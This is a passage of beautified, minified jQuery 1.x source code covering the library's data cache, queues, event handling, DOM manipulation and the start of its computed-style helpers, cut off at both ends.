        (n = pe.getElementsByTagName("body")[0]) && n.style && (t = pe.createElement("div"), (o = pe.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", n.appendChild(o).appendChild(t), typeof t.style.zoom !== xe && (t.style.cssText = "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1", ne.inlineBlockNeedsLayout = e = 3 === t.offsetWidth, e && (n.style.zoom = 1)), n.removeChild(o))
    }),
    function() {
        var e = pe.createElement("div");
        if (null == ne.deleteExpando) {
            ne.deleteExpando = !0;
            try {
                delete e.test
            } catch (t) {
                ne.deleteExpando = !1
            }
        }
        e = null
    }(),
    ie.acceptData = function(e) {
        var t = ie.noData[(e.nodeName + " ").toLowerCase()],
            n = +e.nodeType || 1;
        return (1 === n || 9 === n) && (!t || !0 !== t && e.getAttribute("classid") === t)
    };
    var Ve = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        we = /([A-Z])/g;
    ie.extend({
        cache: {},
        noData: {
            "applet ": !0,
            "embed ": !0,
            "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        },
        hasData: function(e) {
            return !!(e = e.nodeType ? ie.cache[e[ie.expando]] : e[ie.expando]) && !u(e)
        },
        data: function(e, t, n) {
            return d(e, t, n)
        },
        removeData: function(e, t) {
            return f(e, t)
        },
        _data: function(e, t, n) {
            return d(e, t, n, !0)
        },
        _removeData: function(e, t) {
            return f(e, t, !0)
        }
    }),
    ie.fn.extend({
        data: function(e, t) {
            var n,
                o,
                i,
                r = this[0],
                a = r && r.attributes;
            if (void 0 === e) {
                if (this.length && (i = ie.data(r), 1 === r.nodeType && !ie._data(r, "parsedAttrs"))) {
                    for (n = a.length; n--;)
                        a[n] && (0 === (o = a[n].name).indexOf("data-") && c(r, o = ie.camelCase(o.slice(5)), i[o]));
                    ie._data(r, "parsedAttrs", !0)
                }
                return i
            }
            return "object" == typeof e ? this.each(function() {
                ie.data(this, e)
            }) : 1 < arguments.length ? this.each(function() {
                ie.data(this, e, t)
            }) : r ? c(r, e, ie.data(r, e)) : void 0
        },
        removeData: function(e) {
            return this.each(function() {
                ie.removeData(this, e)
            })
        }
    }),
    ie.extend({
        queue: function(e, t, n) {
            var o;
            return e ? (t = (t || "fx") + "queue", o = ie._data(e, t), n && (!o || ie.isArray(n) ? o = ie._data(e, t, ie.makeArray(n)) : o.push(n)), o || []) : void 0
        },
        dequeue: function(e, t) {
            t = t || "fx";
            var n = ie.queue(e, t),
                o = n.length,
                i = n.shift(),
                r = ie._queueHooks(e, t),
                a = function() {
                    ie.dequeue(e, t)
                };
            "inprogress" === i && (i = n.shift(), o--),
            i && ("fx" === t && n.unshift("inprogress"), delete r.stop, i.call(e, a, r)),
            !o && r && r.empty.fire()
        },
        _queueHooks: function(e, t) {
            var n = t + "queueHooks";
            return ie._data(e, n) || ie._data(e, n, {
                    empty: ie.Callbacks("once memory").add(function() {
                        ie._removeData(e, t + "queue"),
                        ie._removeData(e, n)
                    })
                })
        }
    }),
    ie.fn.extend({
        queue: function(t, n) {
            var e = 2;
            return "string" != typeof t && (n = t, t = "fx", e--), arguments.length < e ? ie.queue(this[0], t) : void 0 === n ? this : this.each(function() {
                var e = ie.queue(this, t, n);
                ie._queueHooks(this, t),
                "fx" === t && "inprogress" !== e[0] && ie.dequeue(this, t)
            })
        },
        dequeue: function(e) {
            return this.each(function() {
                ie.dequeue(this, e)
            })
        },
        clearQueue: function(e) {
            return this.queue(e || "fx", [])
        },
        promise: function(e, t) {
            var n,
                o = 1,
                i = ie.Deferred(),
                r = this,
                a = this.length,
                s = function() {
                    --o || i.resolveWith(r, [r])
                };
            for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; a--;)
                (n = ie._data(r[a], e + "queueHooks")) && n.empty && (o++, n.empty.add(s));
            return s(), i.promise(t)
        }
    });
    var Ce = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        ke = ["Top", "Right", "Bottom", "Left"],
        Ee = function(e, t) {
            return e = t || e, "none" === ie.css(e, "display") || !ie.contains(e.ownerDocument, e)
        },
        Ie = ie.access = function(e, t, n, o, i, r, a) {
            var s = 0,
                l = e.length,
                c = null == n;
            if ("object" === ie.type(n))
                for (s in i = !0, n)
                    ie.access(e, t, s, n[s], !0, r, a);
            else if (void 0 !== o && (i = !0, ie.isFunction(o) || (a = !0), c && (a ? (t.call(e, o), t = null) : (c = t, t = function(e, t, n) {
                return c.call(ie(e), n)
            })), t))
                for (; s < l; s++)
                    t(e[s], n, a ? o : o.call(e[s], s, t(e[s], n)));
            return i ? e : c ? t.call(e) : l ? t(e[0], n) : r
        },
        Ne = /^(?:checkbox|radio)$/i;
    !function() {
        var e = pe.createElement("input"),
            t = pe.createElement("div"),
            n = pe.createDocumentFragment();
        if (t.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", ne.leadingWhitespace = 3 === t.firstChild.nodeType, ne.tbody = !t.getElementsByTagName("tbody").length, ne.htmlSerialize = !!t.getElementsByTagName("link").length, ne.html5Clone = "<:nav></:nav>" !== pe.createElement("nav").cloneNode(!0).outerHTML, e.type = "checkbox", e.checked = !0, n.appendChild(e), ne.appendChecked = e.checked, t.innerHTML = "<textarea>x</textarea>", ne.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue, n.appendChild(t), t.innerHTML = "<input type='radio' checked='checked' name='t'/>", ne.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked, ne.noCloneEvent = !0, t.attachEvent && (t.attachEvent("onclick", function() {
            ne.noCloneEvent = !1
        }), t.cloneNode(!0).click()), null == ne.deleteExpando) {
            ne.deleteExpando = !0;
            try {
                delete t.test
            } catch (o) {
                ne.deleteExpando = !1
            }
        }
    }(),
    function() {
        var e,
            t,
            n = pe.createElement("div");
        for (e in {
            submit: !0,
            change: !0,
            focusin: !0
        })
            t = "on" + e,
            (ne[e + "Bubbles"] = t in p) || (n.setAttribute(t, "t"), ne[e + "Bubbles"] = !1 === n.attributes[t].expando);
        n = null
    }();
    var Pe = /^(?:input|select|textarea)$/i,
        Fe = /^key/,
        Ae = /^(?:mouse|pointer|contextmenu)|click/,
        _e = /^(?:focusinfocus|focusoutblur)$/,
        Be = /^([^.]*)(?:\.(.+)|)$/;
    ie.event = {
        global: {},
        add: function(e, t, n, o, i) {
            var r,
                a,
                s,
                l,
                c,
                u,
                d,
                f,
                h,
                p,
                g,
                m = ie._data(e);
            if (m) {
                for (n.handler && (n = (l = n).handler, i = l.selector), n.guid || (n.guid = ie.guid++), (a = m.events) || (a = m.events = {}), (u = m.handle) || ((u = m.handle = function(e) {
                    return typeof ie === xe || e && ie.event.triggered === e.type ? void 0 : ie.event.dispatch.apply(u.elem, arguments)
                }).elem = e), s = (t = (t || "").match(Se) || [""]).length; s--;)
                    h = g = (r = Be.exec(t[s]) || [])[1],
                    p = (r[2] || "").split(".").sort(),
                    h && (c = ie.event.special[h] || {}, h = (i ? c.delegateType : c.bindType) || h, c = ie.event.special[h] || {}, d = ie.extend({
                        type: h,
                        origType: g,
                        data: o,
                        handler: n,
                        guid: n.guid,
                        selector: i,
                        needsContext: i && ie.expr.match.needsContext.test(i),
                        namespace: p.join(".")
                    }, l), (f = a[h]) || ((f = a[h] = []).delegateCount = 0, c.setup && !1 !== c.setup.call(e, o, p, u) || (e.addEventListener ? e.addEventListener(h, u, !1) : e.attachEvent && e.attachEvent("on" + h, u))), c.add && (c.add.call(e, d), d.handler.guid || (d.handler.guid = n.guid)), i ? f.splice(f.delegateCount++, 0, d) : f.push(d), ie.event.global[h] = !0);
                e = null
            }
        },
        remove: function(e, t, n, o, i) {
            var r,
                a,
                s,
                l,
                c,
                u,
                d,
                f,
                h,
                p,
                g,
                m = ie.hasData(e) && ie._data(e);
            if (m && (u = m.events)) {
                for (c = (t = (t || "").match(Se) || [""]).length; c--;)
                    if (h = g = (s = Be.exec(t[c]) || [])[1], p = (s[2] || "").split(".").sort(), h) {
                        for (d = ie.event.special[h] || {}, f = u[h = (o ? d.delegateType : d.bindType) || h] || [], s = s[2] && new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)"), l = r = f.length; r--;)
                            a = f[r],
                            !i && g !== a.origType || n && n.guid !== a.guid || s && !s.test(a.namespace) || o && o !== a.selector && ("**" !== o || !a.selector) || (f.splice(r, 1), a.selector && f.delegateCount--, d.remove && d.remove.call(e, a));
                        l && !f.length && (d.teardown && !1 !== d.teardown.call(e, p, m.handle) || ie.removeEvent(e, h, m.handle), delete u[h])
                    } else
                        for (h in u)
                            ie.event.remove(e, h + t[c], n, o, !0);
                ie.isEmptyObject(u) && (delete m.handle, ie._removeData(e, "events"))
            }
        },
        trigger: function(e, t, n, o) {
            var i,
                r,
                a,
                s,
                l,
                c,
                u,
                d = [n || pe],
                f = te.call(e, "type") ? e.type : e,
                h = te.call(e, "namespace") ? e.namespace.split(".") : [];
            if (a = c = n = n || pe, 3 !== n.nodeType && 8 !== n.nodeType && !_e.test(f + ie.event.triggered) && (0 <= f.indexOf(".") && (f = (h = f.split(".")).shift(), h.sort()), r = f.indexOf(":") < 0 && "on" + f, (e = e[ie.expando] ? e : new ie.Event(f, "object" == typeof e && e)).isTrigger = o ? 2 : 3, e.namespace = h.join("."), e.namespace_re = e.namespace ? new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = n), t = null == t ? [e] : ie.makeArray(t, [e]), l = ie.event.special[f] || {}, o || !l.trigger || !1 !== l.trigger.apply(n, t))) {
                if (!o && !l.noBubble && !ie.isWindow(n)) {
                    for (s = l.delegateType || f, _e.test(s + f) || (a = a.parentNode); a; a = a.parentNode)
                        d.push(a),
                        c = a;
                    c === (n.ownerDocument || pe) && d.push(c.defaultView || c.parentWindow || p)
                }
                for (u = 0; (a = d[u++]) && !e.isPropagationStopped();)
                    e.type = 1 < u ? s : l.bindType || f,
                    (i = (ie._data(a, "events") || {})[e.type] && ie._data(a, "handle")) && i.apply(a, t),
                    (i = r && a[r]) && i.apply && ie.acceptData(a) && (e.result = i.apply(a, t), !1 === e.result && e.preventDefault());
                if (e.type = f, !o && !e.isDefaultPrevented() && (!l._default || !1 === l._default.apply(d.pop(), t)) && ie.acceptData(n) && r && n[f] && !ie.isWindow(n)) {
                    (c = n[r]) && (n[r] = null),
                    ie.event.triggered = f;
                    try {
                        n[f]()
                    } catch (g) {}
                    ie.event.triggered = void 0,
                    c && (n[r] = c)
                }
                return e.result
            }
        },
        dispatch: function(e) {
            e = ie.event.fix(e);
            var t,
                n,
                o,
                i,
                r,
                a = [],
                s = X.call(arguments),
                l = (ie._data(this, "events") || {})[e.type] || [],
                c = ie.event.special[e.type] || {};
            if ((s[0] = e).delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, e)) {
                for (a = ie.event.handlers.call(this, e, l), t = 0; (i = a[t++]) && !e.isPropagationStopped();)
                    for (e.currentTarget = i.elem, r = 0; (o = i.handlers[r++]) && !e.isImmediatePropagationStopped();)
                        (!e.namespace_re || e.namespace_re.test(o.namespace)) && (e.handleObj = o, e.data = o.data, void 0 !== (n = ((ie.event.special[o.origType] || {}).handle || o.handler).apply(i.elem, s)) && !1 === (e.result = n) && (e.preventDefault(), e.stopPropagation()));
                return c.postDispatch && c.postDispatch.call(this, e), e.result
            }
        },
        handlers: function(e, t) {
            var n,
                o,
                i,
                r,
                a = [],
                s = t.delegateCount,
                l = e.target;
            if (s && l.nodeType && (!e.button || "click" !== e.type))
                for (; l != this; l = l.parentNode || this)
                    if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
                        for (i = [], r = 0; r < s; r++)
                            void 0 === i[n = (o = t[r]).selector + " "] && (i[n] = o.needsContext ? 0 <= ie(n, this).index(l) : ie.find(n, this, null, [l]).length),
                            i[n] && i.push(o);
                        i.length && a.push({
                            elem: l,
                            handlers: i
                        })
                    }
            return s < t.length && a.push({
                elem: this,
                handlers: t.slice(s)
            }), a
        },
        fix: function(e) {
            if (e[ie.expando])
                return e;
            var t,
                n,
                o,
                i = e.type,
                r = e,
                a = this.fixHooks[i];
            for (a || (this.fixHooks[i] = a = Ae.test(i) ? this.mouseHooks : Fe.test(i) ? this.keyHooks : {}), o = a.props ? this.props.concat(a.props) : this.props, e = new ie.Event(r), t = o.length; t--;)
                e[n = o[t]] = r[n];
            return e.target || (e.target = r.srcElement || pe), 3 === e.target.nodeType && (e.target = e.target.parentNode), e.metaKey = !!e.metaKey, a.filter ? a.filter(e, r) : e
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "),
            filter: function(e, t) {
                return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(e, t) {
                var n,
                    o,
                    i,
                    r = t.button,
                    a = t.fromElement;
                return null == e.pageX && null != t.clientX && (i = (o = e.target.ownerDocument || pe).documentElement, n = o.body, e.pageX = t.clientX + (i && i.scrollLeft || n && n.scrollLeft || 0) - (i && i.clientLeft || n && n.clientLeft || 0), e.pageY = t.clientY + (i && i.scrollTop || n && n.scrollTop || 0) - (i && i.clientTop || n && n.clientTop || 0)), !e.relatedTarget && a && (e.relatedTarget = a === e.target ? t.toElement : a), e.which || void 0 === r || (e.which = 1 & r ? 1 : 2 & r ? 3 : 4 & r ? 2 : 0), e
            }
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    if (this !== a() && this.focus)
                        try {
                            return this.focus(), !1
                        } catch (p) {}
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    return this === a() && this.blur ? (this.blur(), !1) : void 0
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    return ie.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(), !1) : void 0
                },
                _default: function(e) {
                    return ie.nodeName(e.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(e) {
                    void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                }
            }
        },
        simulate: function(e, t, n, o) {
            var i = ie.extend(new ie.Event, n, {
                type: e,
                isSimulated: !0,
                originalEvent: {}
            });
            o ? ie.event.trigger(i, null, t) : ie.event.dispatch.call(t, i),
            i.isDefaultPrevented() && n.preventDefault()
        }
    },
    ie.removeEvent = pe.removeEventListener ? function(e, t, n) {
        e.removeEventListener && e.removeEventListener(t, n, !1)
    } : function(e, t, n) {
        var o = "on" + t;
        e.detachEvent && (typeof e[o] === xe && (e[o] = null), e.detachEvent(o, n))
    },
    ie.Event = function(e, t) {
        return this instanceof ie.Event ? (e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? r : h) : this.type = e, t && ie.extend(this, t), this.timeStamp = e && e.timeStamp || ie.now(), void (this[ie.expando] = !0)) : new ie.Event(e, t)
    },
    ie.Event.prototype = {
        isDefaultPrevented: h,
        isPropagationStopped: h,
        isImmediatePropagationStopped: h,
        preventDefault: function() {
            var e = this.originalEvent;
            this.isDefaultPrevented = r,
            e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1)
        },
        stopPropagation: function() {
            var e = this.originalEvent;
            this.isPropagationStopped = r,
            e && (e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0)
        },
        stopImmediatePropagation: function() {
            var e = this.originalEvent;
            this.isImmediatePropagationStopped = r,
            e && e.stopImmediatePropagation && e.stopImmediatePropagation(),
            this.stopPropagation()
        }
    },
    ie.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, function(e, r) {
        ie.event.special[e] = {
            delegateType: r,
            bindType: r,
            handle: function(e) {
                var t,
                    n = this,
                    o = e.relatedTarget,
                    i = e.handleObj;
                return (!o || o !== n && !ie.contains(n, o)) && (e.type = i.origType, t = i.handler.apply(this, arguments), e.type = r), t
            }
        }
    }),
    ne.submitBubbles || (ie.event.special.submit = {
        setup: function() {
            return !ie.nodeName(this, "form") && void ie.event.add(this, "click._submit keypress._submit", function(e) {
                    var t = e.target,
                        n = ie.nodeName(t, "input") || ie.nodeName(t, "button") ? t.form : void 0;
                    n && !ie._data(n, "submitBubbles") && (ie.event.add(n, "submit._submit", function(e) {
                        e._submit_bubble = !0
                    }), ie._data(n, "submitBubbles", !0))
                })
        },
        postDispatch: function(e) {
            e._submit_bubble && (delete e._submit_bubble, this.parentNode && !e.isTrigger && ie.event.simulate("submit", this.parentNode, e, !0))
        },
        teardown: function() {
            return !ie.nodeName(this, "form") && void ie.event.remove(this, "._submit")
        }
    }),
    ne.changeBubbles || (ie.event.special.change = {
        setup: function() {
            return Pe.test(this.nodeName) ? (("checkbox" === this.type || "radio" === this.type) && (ie.event.add(this, "propertychange._change", function(e) {
                "checked" === e.originalEvent.propertyName && (this._just_changed = !0)
            }), ie.event.add(this, "click._change", function(e) {
                this._just_changed && !e.isTrigger && (this._just_changed = !1),
                ie.event.simulate("change", this, e, !0)
            })), !1) : void ie.event.add(this, "beforeactivate._change", function(e) {
                var t = e.target;
                Pe.test(t.nodeName) && !ie._data(t, "changeBubbles") && (ie.event.add(t, "change._change", function(e) {
                    !this.parentNode || e.isSimulated || e.isTrigger || ie.event.simulate("change", this.parentNode, e, !0)
                }), ie._data(t, "changeBubbles", !0))
            })
        },
        handle: function(e) {
            var t = e.target;
            return this !== t || e.isSimulated || e.isTrigger || "radio" !== t.type && "checkbox" !== t.type ? e.handleObj.handler.apply(this, arguments) : void 0
        },
        teardown: function() {
            return ie.event.remove(this, "._change"), !Pe.test(this.nodeName)
        }
    }),
    ne.focusinBubbles || ie.each({
        focus: "focusin",
        blur: "focusout"
    }, function(n, o) {
        var i = function(e) {
            ie.event.simulate(o, e.target, ie.event.fix(e), !0)
        };
        ie.event.special[o] = {
            setup: function() {
                var e = this.ownerDocument || this,
                    t = ie._data(e, o);
                t || e.addEventListener(n, i, !0),
                ie._data(e, o, (t || 0) + 1)
            },
            teardown: function() {
                var e = this.ownerDocument || this,
                    t = ie._data(e, o) - 1;
                t ? ie._data(e, o, t) : (e.removeEventListener(n, i, !0), ie._removeData(e, o))
            }
        }
    }),
    ie.fn.extend({
        on: function(e, t, n, o, i) {
            var r,
                a;
            if ("object" == typeof e) {
                for (r in "string" != typeof t && (n = n || t, t = void 0), e)
                    this.on(r, t, n, e[r], i);
                return this
            }
            if (null == n && null == o ? (o = t, n = t = void 0) : null == o && ("string" == typeof t ? (o = n, n = void 0) : (o = n, n = t, t = void 0)), !1 === o)
                o = h;
            else if (!o)
                return this;
            return 1 === i && (a = o, (o = function(e) {
                return ie().off(e), a.apply(this, arguments)
            }).guid = a.guid || (a.guid = ie.guid++)), this.each(function() {
                ie.event.add(this, e, o, n, t)
            })
        },
        one: function(e, t, n, o) {
            return this.on(e, t, n, o, 1)
        },
        off: function(e, t, n) {
            var o,
                i;
            if (e && e.preventDefault && e.handleObj)
                return o = e.handleObj, ie(e.delegateTarget).off(o.namespace ? o.origType + "." + o.namespace : o.origType, o.selector, o.handler), this;
            if ("object" == typeof e) {
                for (i in e)
                    this.off(i, t, e[i]);
                return this
            }
            return (!1 === t || "function" == typeof t) && (n = t, t = void 0), !1 === n && (n = h), this.each(function() {
                ie.event.remove(this, e, n, t)
            })
        },
        trigger: function(e, t) {
            return this.each(function() {
                ie.event.trigger(e, t, this)
            })
        },
        triggerHandler: function(e, t) {
            var n = this[0];
            return n ? ie.event.trigger(e, t, n, !0) : void 0
        }
    });
    var He = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
        Re = / jQuery\d+="(?:null|\d+)"/g,
        Le = new RegExp("<(?:" + He + ")[\\s/>]", "i"),
        je = /^\s+/,
        Me = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
        Oe = /<([\w:]+)/,
        De = /<tbody/i,
        Ue = /<|&#?\w+;/,
        We = /<(?:script|style|link)/i,
        Ge = /checked\s*(?:[^=]|=\s*.checked.)/i,
        ze = /^$|\/(?:java|ecma)script/i,
        Je = /^true\/(.*)/,
        qe = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
        $e = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            legend: [1, "<fieldset>", "</fieldset>"],
            area: [1, "<map>", "</map>"],
            param: [1, "<object>", "</object>"],
            thead: [1, "<table>", "</table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: ne.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
        },
        Xe = g(pe).appendChild(pe.createElement("div"));
    $e.optgroup = $e.option,
    $e.tbody = $e.tfoot = $e.colgroup = $e.caption = $e.thead,
    $e.th = $e.td,
    ie.extend({
        clone: function(e, t, n) {
            var o,
                i,
                r,
                a,
                s,
                l = ie.contains(e.ownerDocument, e);
            if (ne.html5Clone || ie.isXMLDoc(e) || !Le.test("<" + e.nodeName + ">") ? r = e.cloneNode(!0) : (Xe.innerHTML = e.outerHTML, Xe.removeChild(r = Xe.firstChild)), !(ne.noCloneEvent && ne.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || ie.isXMLDoc(e)))
                for (o = m(r), s = m(e), a = 0; null != (i = s[a]); ++a)
                    o[a] && x(i, o[a]);
            if (t)
                if (n)
                    for (s = s || m(e), o = o || m(r), a = 0; null != (i = s[a]); a++)
                        w(i, o[a]);
                else
                    w(e, r);
            return 0 < (o = m(r, "script")).length && b(o, !l && m(e, "script")), o = s = i = null, r
        },
        buildFragment: function(e, t, n, o) {
            for (var i, r, a, s, l, c, u, d = e.length, f = g(t), h = [], p = 0; p < d; p++)
                if ((r = e[p]) || 0 === r)
                    if ("object" === ie.type(r))
                        ie.merge(h, r.nodeType ? [r] : r);
                    else if (Ue.test(r)) {
                        for (s = s || f.appendChild(t.createElement("div")), l = (Oe.exec(r) || ["", ""])[1].toLowerCase(), u = $e[l] || $e._default, s.innerHTML = u[1] + r.replace(Me, "<$1></$2>") + u[2], i = u[0]; i--;)
                            s = s.lastChild;
                        if (!ne.leadingWhitespace && je.test(r) && h.push(t.createTextNode(je.exec(r)[0])), !ne.tbody)
                            for (i = (r = "table" !== l || De.test(r) ? "<table>" !== u[1] || De.test(r) ? 0 : s : s.firstChild) && r.childNodes.length; i--;)
                                ie.nodeName(c = r.childNodes[i], "tbody") && !c.childNodes.length && r.removeChild(c);
                        for (ie.merge(h, s.childNodes), s.textContent = ""; s.firstChild;)
                            s.removeChild(s.firstChild);
                        s = f.lastChild
                    } else
                        h.push(t.createTextNode(r));
            for (s && f.removeChild(s), ne.appendChecked || ie.grep(m(h, "input"), v), p = 0; r = h[p++];)
                if ((!o || -1 === ie.inArray(r, o)) && (a = ie.contains(r.ownerDocument, r), s = m(f.appendChild(r), "script"), a && b(s), n))
                    for (i = 0; r = s[i++];)
                        ze.test(r.type || "") && n.push(r);
            return s = null, f
        },
        cleanData: function(e, t) {
            for (var n, o, i, r, a = 0, s = ie.expando, l = ie.cache, c = ne.deleteExpando, u = ie.event.special; null != (n = e[a]); a++)
                if ((t || ie.acceptData(n)) && (r = (i = n[s]) && l[i])) {
                    if (r.events)
                        for (o in r.events)
                            u[o] ? ie.event.remove(n, o) : ie.removeEvent(n, o, r.handle);
                    l[i] && (delete l[i], c ? delete n[s] : typeof n.removeAttribute !== xe ? n.removeAttribute(s) : n[s] = null, $.push(i))
                }
        }
    }),
    ie.fn.extend({
        text: function(e) {
            return Ie(this, function(e) {
                return void 0 === e ? ie.text(this) : this.empty().append((this[0] && this[0].ownerDocument || pe).createTextNode(e))
            }, null, e, arguments.length)
        },
        append: function() {
            return this.domManip(arguments, function(e) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || T(this, e).appendChild(e)
            })
        },
        prepend: function() {
            return this.domManip(arguments, function(e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var t = T(this, e);
                    t.insertBefore(e, t.firstChild)
                }
            })
        },
        before: function() {
            return this.domManip(arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this)
            })
        },
        after: function() {
            return this.domManip(arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
            })
        },
        remove: function(e, t) {
            for (var n, o = e ? ie.filter(e, this) : this, i = 0; null != (n = o[i]); i++)
                t || 1 !== n.nodeType || ie.cleanData(m(n)),
                n.parentNode && (t && ie.contains(n.ownerDocument, n) && b(m(n, "script")), n.parentNode.removeChild(n));
            return this
        },
        empty: function() {
            for (var e, t = 0; null != (e = this[t]); t++) {
                for (1 === e.nodeType && ie.cleanData(m(e, !1)); e.firstChild;)
                    e.removeChild(e.firstChild);
                e.options && ie.nodeName(e, "select") && (e.options.length = 0)
            }
            return this
        },
        clone: function(e, t) {
            return e = null != e && e, t = null == t ? e : t, this.map(function() {
                return ie.clone(this, e, t)
            })
        },
        html: function(e) {
            return Ie(this, function(e) {
                var t = this[0] || {},
                    n = 0,
                    o = this.length;
                if (void 0 === e)
                    return 1 === t.nodeType ? t.innerHTML.replace(Re, "") : void 0;
                if (!("string" != typeof e || We.test(e) || !ne.htmlSerialize && Le.test(e) || !ne.leadingWhitespace && je.test(e) || $e[(Oe.exec(e) || ["", ""])[1].toLowerCase()])) {
                    e = e.replace(Me, "<$1></$2>");
                    try {
                        for (; n < o; n++)
                            1 === (t = this[n] || {}).nodeType && (ie.cleanData(m(t, !1)), t.innerHTML = e);
                        t = 0
                    } catch (i) {}
                }
                t && this.empty().append(e)
            }, null, e, arguments.length)
        },
        replaceWith: function(e) {
            var t = e;
            return this.domManip(arguments, function(e) {
                t = this.parentNode,
                ie.cleanData(m(this)),
                t && t.replaceChild(e, this)
            }), t && (t.length || t.nodeType) ? this : this.remove()
        },
        detach: function(e) {
            return this.remove(e, !0)
        },
        domManip: function(n, o) {
            n = Y.apply([], n);
            var e,
                t,
                i,
                r,
                a,
                s,
                l = 0,
                c = this.length,
                u = this,
                d = c - 1,
                f = n[0],
                h = ie.isFunction(f);
            if (h || 1 < c && "string" == typeof f && !ne.checkClone && Ge.test(f))
                return this.each(function(e) {
                    var t = u.eq(e);
                    h && (n[0] = f.call(this, e, t.html())),
                    t.domManip(n, o)
                });
            if (c && (e = (s = ie.buildFragment(n, this[0].ownerDocument, !1, this)).firstChild, 1 === s.childNodes.length && (s = e), e)) {
                for (i = (r = ie.map(m(s, "script"), S)).length; l < c; l++)
                    t = s,
                    l !== d && (t = ie.clone(t, !0, !0), i && ie.merge(r, m(t, "script"))),
                    o.call(this[l], t, l);
                if (i)
                    for (a = r[r.length - 1].ownerDocument, ie.map(r, y), l = 0; l < i; l++)
                        t = r[l],
                        ze.test(t.type || "") && !ie._data(t, "globalEval") && ie.contains(a, t) && (t.src ? ie._evalUrl && ie._evalUrl(t.src) : ie.globalEval((t.text || t.textContent || t.innerHTML || "").replace(qe, "")));
                s = e = null
            }
            return this
        }
    }),
    ie.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(e, a) {
        ie.fn[e] = function(e) {
            for (var t, n = 0, o = [], i = ie(e), r = i.length - 1; n <= r; n++)
                t = n === r ? this : this.clone(!0),
                ie(i[n])[a](t),
                K.apply(o, t.get());
            return this.pushStack(o)
        }
    });
    var Ye,
        Ke,
        Qe = {};
    ne.shrinkWrapBlocks = function() {
        return null != Ke ? Ke : (Ke = !1, (t = pe.getElementsByTagName("body")[0]) && t.style ? (e = pe.createElement("div"), (n = pe.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", t.appendChild(n).appendChild(e), typeof e.style.zoom !== xe && (e.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1", e.appendChild(pe.createElement("div")).style.width = "5px", Ke = 3 !== e.offsetWidth), t.removeChild(n), Ke) : void 0);
        var e,
            t,
            n
    };
    var Ze,
        et,
        tt = /^margin/,
        nt = new RegExp("^(" + Ce + ")(?!px)[a-z%]+$", "i"),
        ot = /^(top|right|bottom|left)$/;
    p.getComputedStyle ? (Ze = function(e) {
        return e.ownerDocument.defaultView.opener ? e.ownerDocument.defaultView.getComputedStyle(e, null) : p.getComputedStyle(e, null)
    }, et = function(e, t, n) {
        var o,
            i,
            r,
            a,
            s = e.style;
        return a = (n = n || Ze(e)) ? n.getPropertyValue(t) || n[t] : void 0, n && ("" !== a || ie.contains(e.ownerDocument, e) || (a = ie.style(e, t)), nt.test(a) && tt.test(t) && (o = s.width, i = s.minWidth, r = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = o, s.minWidth = i, s.maxWidth = r)), void 0 === a ? a : a + ""
    }) : pe.documentElement.currentStyle && (Ze = function(e) {
        return e.currentStyle
    }, et = function(e, t, n) {
        var o,
            i,
            r,
            a,
            s = e.style;
